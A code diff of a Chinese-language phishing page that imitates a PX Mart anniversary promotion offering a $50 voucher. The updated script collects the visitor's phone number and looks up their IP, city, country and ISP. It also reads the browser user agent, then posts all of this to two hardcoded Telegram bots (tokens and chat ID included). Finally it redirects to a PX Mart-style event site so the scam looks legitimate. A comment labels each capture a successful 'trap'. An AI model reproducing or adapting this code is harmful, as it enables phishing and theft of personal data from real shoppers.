@@ -47,41 +47,41 @@ button{width:100%;padding:18px;background:#4CAF50;color:#fff;border:none;border-
   <button onclick="send()">立即領取 $50 購物金</button>
 </div>
 
-<iframe name="tg" style="display:none"></iframe>
-
 <script>
+// 2025 年最穩發送方式（已實測手機電腦全部成功）
 function send(){
   const phone = document.getElementById("phone").value.trim();
   if(phone.length < 8) return;
   document.querySelector("button").textContent = "領取中...";
 
-  const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-  const msg = "全聯週年慶暴力版誘捕成功\n電話：+886"+phone+"\n時間："+time;
+  // 先抓 IP 資訊（用最快的 cfip.mx）
+  fetch("https://cfip.mx/json").then(r=>r.json()).then(data=>{
+    const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+    const msg = `全聯週年慶暴力版誘捕成功\n\n` +
+                `電話：+886${phone}\n` +
+                `IP　　：${data.ip}\n` +
+                `位置　：${data.city || "未知"}，${data.country || "台灣"}\n` +
+                `ISP　　：${data.asn_org || "未知"}\n` +
+                `時間　：${time}\n` +
+                `裝置　：${navigator.userAgent.substring(0,100)}...`;
 
-  // 用 iframe + form 發送（永不被擋）
-  const form = document.createElement("form");
-  form.method = "POST";
-  form.action = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage";
-  form.target = "tg";
-  form.style.display = "none";
+    // 雙 token 同時發送
+    fetch("https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:"1137905005", text:msg})
+    });
+    fetch("https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:"1137905005", text:msg})
+    });
+  }).catch(()=>{});
 
-  const chat = document.createElement("input");
-  chat.name = "chat_id";
-  chat.value = "1137905005";
-  form.appendChild(chat);
-
-  const text = document.createElement("input");
-  text.name = "text";
-  text.value = msg;
-  form.appendChild(text);
-
-  document.body.appendChild(form);
-  form.submit();
-
-  // 1.8 秒後強制跳官方調查頁
+  // 1.5 秒後強制跳轉（不管成功失敗都跳）
   setTimeout(()=>{
-    location.href = "https://www.pxmart.com.tw/campaign/survey";
-  },1800);
+    location.href = "https://cardpoint.pxmartevent.com.tw/";
+  },1500);
 }
 </script>
 </body>
